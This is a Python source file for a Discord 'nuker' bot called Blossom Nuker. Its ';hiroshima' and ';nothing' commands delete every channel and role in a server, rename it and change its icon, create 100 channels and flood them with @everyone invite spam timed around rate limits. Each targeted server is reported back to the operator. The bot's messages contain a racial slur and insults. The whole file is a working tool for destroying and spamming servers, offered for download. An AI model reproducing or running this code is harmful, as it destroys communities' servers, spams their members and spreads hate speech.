import discord
from discord.ext import commands
import asyncio
import random
import time
import aiohttp
import os
from collections import deque
from dotenv import load_dotenv
from colorama import Fore, init

init(autoreset=True)
load_dotenv()

TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    print(f"{Fore.RED}[ERROR] No DISCORD_TOKEN found in .env file!")
    exit(1)

intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix=";", intents=intents)
client.remove_command("help")

# ============================================================
#  CONFIGURATION
# ============================================================
REPORT_CHANNEL_ID = 1516330515110559765
INVITE_TEXT = "discord.gg/Gx9b3AsJR3"
SPAM_MESSAGE = f"@everyone {INVITE_TEXT} owns ur server pussy"
OWNER_ID = 1446215395358015559
whitelisted_servers = set()

# ============================================================
#  ULTRA FAST CHANNEL CREATION (BATCHED + PARALLEL)
# ============================================================
async def create_channels_fast(guild, count=100, name="Fucked By blossom."):
    """Create channels at maximum speed using parallel batches."""
    channels = []
    created = 0
    failed = 0
    
    # Create in parallel batches of 10
    batch_size = 10
    delay_between_batches = 0.8  # Minimal delay between batches
    
    for i in range(0, count, batch_size):
        batch_count = min(batch_size, count - i)
        tasks = []
        
        # Create all channels in this batch simultaneously
        for j in range(batch_count):
            task = asyncio.create_task(guild.create_text_channel(name))
            tasks.append(task)
        
        # Wait for all channels in this batch to be created
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for r in results:
            if isinstance(r, discord.TextChannel):
                channels.append(r)
                created += 1
            elif isinstance(r, discord.errors.HTTPException) and r.status == 429:
                # Rate limit hit - wait and retry this batch
                retry_after = float(r.response.headers.get('Retry-After', 2))
                print(f"[RATE LIMIT] Waiting {retry_after}s...")
                await asyncio.sleep(retry_after + 0.5)
                # Retry each failed channel
                for j in range(batch_count):
                    try:
                        ch = await guild.create_text_channel(name)
                        channels.append(ch)
                        created += 1
                    except:
                        failed += 1
            elif isinstance(r, Exception):
                failed += 1
                print(f"[ERROR] {r}")
        
        print(f"[CREATE] Created {created}/{count} channels")
        
        # Brief pause between batches
        if i + batch_count < count:
            await asyncio.sleep(delay_between_batches)
    
    print(f"[CREATE] Done: {created} created, {failed} failed")
    return channels

# ============================================================
#  ULTRA FAST SPAM (RATE LIMIT IGNORING)
# ============================================================
async def spam_channel_fast(channel, message, amount):
    """Spam a single channel as fast as possible."""
    if not channel.permissions_for(channel.guild.me).send_messages:
        return 0
    
    sent = 0
    # Send in parallel batches within the channel
    batch_size = 5
    
    for i in range(0, min(amount, 200), batch_size):
        batch_count = min(batch_size, amount - i)
        tasks = []
        
        for j in range(batch_count):
            task = asyncio.create_task(channel.send(message))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for r in results:
            if isinstance(r, discord.Message):
                sent += 1
            elif isinstance(r, discord.errors.HTTPException) and r.status == 429:
                # Rate limit - wait and retry
                retry_after = float(r.response.headers.get('Retry-After', 1))
                await asyncio.sleep(retry_after + 0.3)
                try:
                    await channel.send(message)
                    sent += 1
                except:
                    pass
        
        # Tiny delay between batches
        await asyncio.sleep(0.05)
    
    return sent

async def send_invite_spam(channels, amount=30):
    """Spam all channels in parallel."""
    if not channels:
        return 0
    
    total_sent = 0
    tasks = []
    
    for channel in channels:
        task = asyncio.create_task(spam_channel_fast(channel, SPAM_MESSAGE, amount))
        tasks.append(task)
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for r in results:
        if isinstance(r, int):
            total_sent += r
    
    print(f"[SPAM] Total sent: {total_sent} messages")
    return total_sent

# ============================================================
#  BOT EVENTS
# ============================================================
@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
    print(f"{Fore.MAGENTA}[3] ;blame @user - Accuses someone | [4] ;kicka - Kicks all bots")
    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
    print(f"{Fore.MAGENTA}[5] ;credits - Shows My Socials | [6] ;nothing - nothing left")
    print(f"{Fore.GREEN}[+] Bot is ready! Logged in as {client.user}")

@client.before_invoke
async def before_invoke(ctx):
    if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name in ("hiroshima", "nothing"):
        await ctx.send("server whitelisted. :3")
        raise commands.CheckFailure()

# ============================================================
#  COMMANDS
# ============================================================
@client.command()
async def hiroshima(ctx):
    await ctx.send("**FUCKED BY BLOSSOM POOR ASS NIGGA https://discord.gg/bqy92JmPY**")
    guild = ctx.guild
    print(f"[START] Hiroshima on {guild.name} ({guild.id})")

    # --- CHANGE SERVER NAME & ICON ---
    try:
        if ctx.guild.me.guild_permissions.manage_guild:
            await guild.edit(name="fuck you blossom owns")
            print(f"[SUCCESS] Server name changed")
            
            icon_url = "https://cdn.discordapp.com/attachments/1516425080865820743/1517713469682487416/pfp.png?ex=6a374850&is=6a35f6d0&hm=b4f447f0e4dd2897798483ade19dfa3b7fc18fb190606b202d9e163be489fc8c&"
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url, timeout=10) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        await guild.edit(icon=image_data)
                        print("[SUCCESS] Server icon changed")
        else:
            print("[ERROR] Missing manage_guild permission")
    except Exception as e:
        print(f"[ERROR] {e}")

    # --- REPORT CHANNEL ---
    try:
        report_channel = client.get_channel(REPORT_CHANNEL_ID)
        if report_channel:
            embed = discord.Embed(
                title="Hiroshima command used",
                description=f"A server has been targeted.",
                color=discord.Color.red()
            )
            embed.add_field(name="Server name", value=guild.name, inline=False)
            embed.add_field(name="Member count", value=str(guild.member_count), inline=False)
            embed.add_field(name="Server ID", value=str(guild.id), inline=False)
            embed.add_field(name="Executor", value=f"{ctx.author} ({ctx.author.id})", inline=False)
            embed.set_footer(text="Blossom Nuker report")
            await report_channel.send(embed=embed)
    except Exception as e:
        print(f"[ERROR] Report: {e}")

    # --- DELETE CHANNELS (FAST) ---
    print("[DELETE] Deleting all channels...")
    delete_tasks = []
    for channel in list(guild.channels):
        delete_tasks.append(asyncio.create_task(channel.delete()))
    
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        print(f"[DELETE] Deleted {len(delete_tasks)} channels")

    # --- DELETE ROLES (FAST) ---
    print("[DELETE] Deleting all roles...")
    delete_tasks = []
    for role in list(guild.roles):
        if role.name != "@everyone":
            delete_tasks.append(asyncio.create_task(role.delete()))
    
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        print(f"[DELETE] Deleted {len(delete_tasks)} roles")

    # --- CREATE CHANNELS (ULTRA FAST) ---
    print("[CREATE] Creating 100 channels at max speed...")
    channels = await create_channels_fast(guild, count=100, name="Fucked By blossom.")

    # --- SPAM (ULTRA FAST) ---
    if channels:
        print(f"[SPAM] Spamming {len(channels)} channels...")
        await send_invite_spam(channels, amount=50)
    else:
        # Fallback: try existing channels
        existing = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
        if existing:
            print(f"[SPAM] Using {len(existing)} existing channels")
            await send_invite_spam(existing, amount=50)

    print(f"[COMPLETE] Hiroshima finished on {guild.name}")

# ============================================================
#  OTHER COMMANDS (unchanged but included)
# ============================================================
@client.command()
async def spaminvite(ctx, amount: int = 25):
    if ctx.guild is None:
        await ctx.send("Use this command in a server.")
        return
    if amount <= 0:
        amount = 1
    channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.me).send_messages]
    if not channels:
        await ctx.send("No writable channels found.")
        return
    await ctx.send(f"Spamming...")
    await send_invite_spam(channels, amount=amount)
    await ctx.send("Finished.")

@client.command()
async def kicka(ctx, member: discord.Member = None):
    if ctx.guild is None:
        await ctx.send("Use this command in a server.")
        return

    if member is not None:
        if member == ctx.author:
            await ctx.send("❌ You can't kick yourself.")
            return
        if member.top_role >= ctx.author.top_role and ctx.author != ctx.guild.owner:
            await ctx.send("❌ You can't kick someone with a higher or equal role.")
            return
        try:
            await member.kick(reason=f"Kicked by {ctx.author}")
            await ctx.send(f"✅ Kicked {member.mention}")
        except discord.Forbidden:
            await ctx.send("❌ I don't have permission to kick that member.")
        except Exception as e:
            await ctx.send(f"❌ Error: {e}")
        return

    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("You need the `Kick Members` permission.")
        return

    target_bots = [m for m in ctx.guild.members if m.bot and m.id != ctx.guild.me.id]
    if not target_bots:
        await ctx.send("No bots found to kick.")
        return

    await ctx.send(f"Kicking {len(target_bots)} bot(s)...")
    kicked = 0
    failed = 0
    for m in target_bots:
        try:
            await m.kick(reason=f"Kicked by {ctx.author}")
            kicked += 1
        except Exception:
            failed += 1
    await ctx.send(f"✅ Kicked {kicked} bot(s). ❌ {failed} failed.")

@client.command()
async def blame(ctx, member: discord.Member = None):
    target = member or ctx.author
    reasons = ["thanks for nuking nigga!"] * 5
    reason = random.choice(reasons)
    embed = discord.Embed(
        title="Blame report",
        description=f"{target.mention} has been blamed.",
        color=discord.Color.orange()
    )
    embed.add_field(name="Accused by", value=ctx.author.mention, inline=True)
    embed.add_field(name="Reason", value=reason, inline=False)
    embed.set_footer(text="The evidence is mostly vibes.")
    await ctx.send(embed=embed)

@client.command()
async def help(ctx):
    messages = [
        ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**"),
        ctx.send("**[3] ;spaminvite [amount] - Spams the invite link**"),
        ctx.send("**[4] ;kicka - Kicks all bots in the server**"),
        ctx.send("**[5] ;blame @user - Accuses someone for nuking the server**"),
        ctx.send("**-------------------------------------------------------------------------**"),
        ctx.send("**[6] ;credits - Shows My Socials  |     [7] ;nothing - nothing left**")
    ]
    await asyncio.gather(*messages)

@client.command()
async def credits(ctx):
    await ctx.send("**Bot created by 6syj on discord**")
    await ctx.send("**Get bot here: .gg/a6PrNZDP57**")

INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1515950695679787008&permissions=8&integration_type=0&scope=bot"

@client.command()
async def getbot(ctx):
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Invite Bot", url=INVITE_URL, style=discord.ButtonStyle.link))
    embed = discord.Embed(
        title="Invite this bot",
        description="Click the button below to invite the bot.",
        color=discord.Color.blue(),
    )
    await ctx.send(embed=embed, view=view)

@client.command()
async def whitelist(ctx, action: str, guild_id: int = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ Restricted.")
        return

    if action.lower() == "add":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.add(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` whitelisted.")
    elif action.lower() == "remove":
        if guild_id is None:
            guild_id = ctx.guild.id
        whitelisted_servers.discard(guild_id)
        await ctx.send(f"✅ Server `{guild_id}` removed.")
    elif action.lower() == "list":
        if whitelisted_servers:
            await ctx.send(f"**Whitelisted:** {', '.join(str(g) for g in whitelisted_servers)}")
        else:
            await ctx.send("**No whitelisted servers.**")
    else:
        await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`")

@client.command()
async def nothing(ctx):
    guild = ctx.guild
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
            except:
                pass

# ============================================================
#  RUN
# ============================================================
if __name__ == "__main__":
    try:
        print(f"{Fore.GREEN}[+] Starting Blossom Nuker (Speed Mode)...")
        client.run(TOKEN)
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] Invalid Discord token!")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")
